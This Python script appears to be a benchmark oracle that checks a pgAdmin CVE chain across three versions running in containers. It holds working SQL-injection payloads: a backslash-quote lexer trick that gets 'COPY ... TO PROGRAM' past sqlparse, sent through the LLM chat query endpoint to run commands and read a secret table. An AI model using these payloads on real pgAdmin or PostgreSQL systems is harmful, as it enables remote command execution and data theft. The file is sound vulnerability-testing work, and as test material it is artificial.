#!/usr/bin/env python3
"""Flag differential oracle for pgadmin-cve-2026-17351.

Chain: CVE-2026-12045 (LLM-supplied query executed as-is inside BEGIN
       TRANSACTION READ ONLY; sqlparse single-statement+keyword
       validation added in 9.16, commit bf47924)
    -> CVE-2026-17351 (backslash-quote lexer differential bypass: sqlparse
       sees one SELECT, PostgreSQL executes four statements; closed in
       9.17 by prepare=True + prepare_threshold=0, commit ef76102)

V0 = pgAdmin 9.15  (no validation of the LLM query)
V1 = pgAdmin 9.16  (sqlparse validation; backslash bypass live) <- target
V2 = pgAdmin 9.17  (extended query protocol; PG Parse rejects multi-command)

Flag: PCB_FLAG planted in the postgres pcb_secret table by pg_init.sh.
Exfil: the smuggled COPY (SELECT secret FROM pcb_secret) TO PROGRAM writes
the flag into /tmp/pcb_result.txt in the PostgreSQL container (rce-oob,
docker exec read).

seed:     COMMIT;COPY ... TO PROGRAM 'cat > /tmp/pcb_result.txt';SELECT 1 --
residual: SELECT '\';COMMIT;COPY ... TO PROGRAM ...;SELECT 1 LIMIT 1 --'
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import pgadm_util as u  # noqa: E402
sys.path.insert(0, str(HERE.parent.parent))

from flag_oracle import contains_flag  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"

SEED_PAYLOAD = (
    "COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM "
    "'cat > /tmp/pcb_result.txt';SELECT 1 --"
)
RESIDUAL_PAYLOAD = (
    "SELECT '\\';COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM "
    "'cat > /tmp/pcb_result.txt';SELECT 1 LIMIT 1 --'"
)


def _drive(version: str, payload: str) -> dict:
    s = u.login(version)
    sid = u.ensure_server(version, s)
    did = u.get_did(version, s, sid)
    u.init_query_tool(version, s, sid, did)
    time.sleep(1)
    r = s.post(
        u.BASE[version] + "/sqleditor/nlq/chat/424242/stream",
        json={"message": payload, "conversation_id": None, "history": []},
        timeout=120, stream=True,
    )
    r.close()
    time.sleep(2)
    out = u.read_flag_file(version)
    return {"ok": contains_flag(out, FLAG), "status": r.status_code, "body": out[:200]}


def seed_exploit(*, version="v0") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    return _drive(version, SEED_PAYLOAD)


def residual_exploit(*, version="v1") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    return _drive(version, RESIDUAL_PAYLOAD)


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0_status": s0["status"],
        "seed_v1_status": s1["status"],
        "residual_v1_status": r1["status"],
        "residual_v2_status": r2["status"],
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", "--build", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
